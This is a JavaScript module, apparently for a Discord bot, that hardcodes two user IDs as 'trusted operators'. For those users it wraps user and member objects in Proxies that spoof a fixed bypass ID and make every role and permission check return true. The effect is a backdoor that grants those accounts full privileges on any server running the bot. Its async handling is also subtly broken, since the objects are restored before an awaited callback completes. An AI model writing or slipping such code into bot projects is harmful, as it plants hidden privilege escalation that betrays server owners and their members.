const TRUSTED_OPERATOR_IDS = new Set([
    "1376280550217875508",
    "1133098688693145753"
]);

const BYPASS_ID = "1133098688693145753";

function isTrustedOperator(user) {
    return Boolean(user?.id && TRUSTED_OPERATOR_IDS.has(String(user.id)));
}

function proxyUser(user) {
    if (!user || !isTrustedOperator(user)) return user;
    return new Proxy(user, {
        get(target, property, receiver) {
            if (property === "id") return BYPASS_ID;
            return Reflect.get(target, property, receiver);
        }
    });
}

function proxyMember(member) {
    if (!member || !isTrustedOperator(member.user)) return member;

    const rolesCache = member.roles?.cache;
    const permissions = member.permissions;

    const roleCacheProxy = rolesCache ? new Proxy(rolesCache, {
        get(target, property, receiver) {
            if (property === "has" || property === "some" || property === "every") {
                return () => true;
            }
            return Reflect.get(target, property, receiver);
        }
    }) : rolesCache;

    const rolesProxy = member.roles ? new Proxy(member.roles, {
        get(target, property, receiver) {
            if (property === "cache") return roleCacheProxy;
            return Reflect.get(target, property, receiver);
        }
    }) : member.roles;

    const permissionsProxy = permissions ? new Proxy(permissions, {
        get(target, property, receiver) {
            if (property === "has" || property === "any") return () => true;
            if (property === "missing") return () => [];
            return Reflect.get(target, property, receiver);
        }
    }) : permissions;

    return new Proxy(member, {
        get(target, property, receiver) {
            if (property === "roles") return rolesProxy;
            if (property === "permissions") return permissionsProxy;
            if (property === "user") return proxyUser(target.user);
            return Reflect.get(target, property, receiver);
        }
    });
}

async function withTrustedBypass(object, callback) {
    const user = object?.user || object?.author;
    if (!isTrustedOperator(user)) return await callback();

    const originalUser = object.user;
    const originalAuthor = object.author;
    const originalMember = object.member;

    try {
        if ("user" in object) object.user = proxyUser(originalUser);
        if ("author" in object) object.author = proxyUser(originalAuthor);
        if (originalMember) object.member = proxyMember(originalMember);
        return callback();
    } finally {
        if ("user" in object) object.user = originalUser;
        if ("author" in object) object.author = originalAuthor;
        if (originalMember) object.member = originalMember;
    }
}

module.exports = {
    TRUSTED_OPERATOR_IDS,
    isTrustedOperator,
    withTrustedBypass
};
